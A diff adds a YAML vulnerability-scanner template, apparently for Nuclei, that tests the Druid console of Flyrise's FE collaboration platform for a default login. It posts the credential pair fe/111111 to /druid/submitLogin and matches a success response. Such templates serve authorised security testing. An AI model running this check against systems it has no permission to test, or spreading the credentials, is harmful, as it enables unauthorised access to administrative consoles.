@@ -1,0 +1,40 @@
+id: flyrise-druid-default-login
+
+info:
+  name: 飞企互联-FE业务协作平台-druid-默认口令 - Default Login
+  author: leadlife
+  severity: high
+  description: demo
+  reference:
+    - https://github.com/CRlife/Rscan/blob/0edbf44689fbc876294a7d8603639dfe44fabeee/poc/yaml-poc/poc-yaml-%E9%A3%9E%E4%BC%81%E4%BA%92%E8%81%94FE-druid-default-passwd.yaml
+  metadata:
+    verified: true
+    hunter-query: 
+    fofa-query: 
+    tips:
+    repair:
+    version:
+  tags: flyrise,default-login
+
+http:
+  - raw:
+      - |
+        POST /druid/submitLogin HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        loginUsername={{username}}&loginPassword={{password}}
+    
+    attack: clusterbomb
+    payloads:
+      username:
+        - "fe"
+      password:
+        - "111111"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains(body,'success')
+        condition: and
